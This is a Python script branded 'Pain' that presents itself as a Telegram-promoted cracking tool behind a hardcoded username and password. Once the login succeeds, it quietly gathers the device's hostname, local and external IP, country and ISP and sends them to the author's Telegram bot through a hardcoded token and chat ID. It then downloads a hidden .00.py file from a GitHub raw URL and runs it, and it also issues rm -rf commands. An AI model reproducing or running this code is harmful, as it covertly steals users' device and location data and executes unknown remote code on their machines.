import socket, requests, json, os ,wget, shutil, sys, time
######
os.system("rm -rf ...py ;clear")
pain="      \n       ██████╗░░█████╗░██╗███╗░░██╗      \n      ██╔══██╗██╔══██╗██║████╗░██║      \n      ██████╔╝███████║██║██╔██╗██║      \n      ██╔═══╝░██╔══██║██║██║╚████║      \n      ██║░░░░░██║░░██║██║██║░╚███║      \n      ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝"
print("\n\033[31m")
print(pain)
riz="\033[0;1m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈"
print(riz)
print("\033[90;1m    Github: https://github.com/i4m-Lawa     \n    Chenal: https://t.me/Lawan_CRACKER\n    To Active Tool Message Me On Telegram\033[0;1m \033[31m@i4m_Lawa\033[0;1m")
print(riz)
time.sleep(2)
ss="Lawa"
s="Pain"
sss=input("  User: ")
ssss=input("  Pass: ")
if ss==sss and s==ssss:
    print("\033[32m Correct :)\033[0;1m ✓\033[0;1m")
    time.sleep(3)
    hostname = socket.gethostname()   
    IPAddr = socket.gethostbyname(hostname) 
    urll="https://ident.me"
    external_ip=requests.get(urll).text
    send_url = "https://ipinfo.io/"
    geo_req = requests.get(send_url)
    geo_json = json.loads(geo_req.text)
    wllat = geo_json['country']
    xat = geo_json['org']
    os.system("clear")
    pain="      \n       ██████╗░░█████╗░██╗███╗░░██╗      \n      ██╔══██╗██╔══██╗██║████╗░██║      \n      ██████╔╝███████║██║██╔██╗██║      \n      ██╔═══╝░██╔══██║██║██║╚████║      \n      ██║░░░░░██║░░██║██║██║░╚███║      \n      ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝"
    print("\n\033[31m")
    print(pain)
    riz="\033[0;1m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈"
    print(riz)
    print("\033[90;1m    Github: https://github.com/i4m-Lawa     \n    Chenal: https://t.me/Lawan_CRACKER\n    To Active Tool Message On Telegram\033[0;1m \033[31m@i4m_Lawa\033[0;1m")
    print(riz)
    fff=input(" [-\033[31mSECURITY\033[0;1m-] Your Telegram UserName ?!: ")
    print(" Wait ...")
    IDd= '1534405523'
    tokenn = '1724849039:AAFwM529j1IzJLdLNXvFNXAIbICmDOwIyx8'
    msgg=("\n================================\n [ Pain Opened !!! ]\n Username : " + fff + "\n Device Name :  " + hostname + "\n Device Ip Address :  " + IPAddr + "\n Router Ip Address :  " + external_ip + "\n Country :  " + wllat + "\n Org :  " + xat + "\n================================")
    requests.post(f'https://api.telegram.org/bot{tokenn}/sendMessage?chat_id={IDd}&text={msgg}\n')
    ID= '1534405523' 
    token = '1724849039:AAFwM529j1IzJLdLNXvFNXAIbICmDOwIyx8'
    os.system("cd $HOME ;cd Pain")
    wget.download("https://raw.githubusercontent.com/slrslrslr190/asas/main/.00.py")
    os.system("clear")
    pain="      \n       ██████╗░░█████╗░██╗███╗░░██╗      \n      ██╔══██╗██╔══██╗██║████╗░██║      \n      ██████╔╝███████║██║██╔██╗██║      \n      ██╔═══╝░██╔══██║██║██║╚████║      \n      ██║░░░░░██║░░██║██║██║░╚███║      \n      ╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝"
    print("\n\033[31m")
    print(pain)
    riz="\033[0;1m≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈≈"
    print(riz)
    print("\033[90;1m    Github: https://github.com/i4m-Lawa     \n    Chenal: https://t.me/Lawan_CRACKER\n    To Active Tool Message Me On Telegram\033[0;1m \033[31m@i4m_Lawa\033[0;1m")
    print(riz)
    os.system("python2 .00.py")
else:
  print("\033[31mWrong :( !\033[0;1m")
  time.sleep(3)
  os.system("rm -rf ...py")
